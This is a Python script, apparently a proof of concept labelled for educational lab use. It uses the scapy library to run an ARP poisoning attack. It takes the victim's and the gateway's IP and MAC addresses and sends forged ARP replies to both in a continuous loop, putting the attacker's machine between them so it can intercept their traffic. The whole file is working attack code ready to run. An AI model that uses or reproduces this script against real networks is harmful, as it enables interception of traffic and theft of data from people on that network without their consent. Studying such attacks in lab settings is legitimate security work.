from scapy.all import *
import time
import argparse
from scapy.layers.l2 import Ether, ARP

def parse_args():
    p = argparse.ArgumentParser(description="ARP poisoning PoC — educational lab use only")
    p.add_argument("--victim-ip", required=True, help="IP of the target host")
    p.add_argument("--victim-mac", required=True, help="MAC of the target host")
    p.add_argument("--router-ip", required=True, help="Gateway IP")
    p.add_argument("--router-mac", required=True, help="Gateway MAC")
    p.add_argument("--iface", required=True, help="Network interface number (e.g. 15)")
    return p.parse_args()

def main():
    args = parse_args()

    my_interface = IFACES.dev_from_index(args.iface)  # the actual interface to spoof by
    print(f"Starting ARP poison on interface \n{my_interface}...")
    print(f"[i] Target IP address:{args.victim_ip}")
    attcker_mac = my_interface.mac

    packet1 = Ether(dst=args.victim_mac) / ARP(op=2, hwsrc=attcker_mac, hwdst=args.victim_mac, psrc=args.router_ip, pdst=args.victim_ip)

    packet2 = Ether(dst=args.router_mac) / ARP(op=2, hwsrc=attcker_mac, hwdst=args.router_mac, psrc=args.victim_ip, pdst=args.router_ip)

    try:
        while True:
            sendp(packet1,count = 3, inter = 0.01, iface=my_interface, verbose=False)
            sendp(packet2,count = 3, inter = 0.01, iface=my_interface, verbose=False)
            time.sleep(0.1)
            print(".", end="", flush=True)
    except KeyboardInterrupt:
        print("\nStopping ARP poison...")

if __name__ == '__main__':
    main()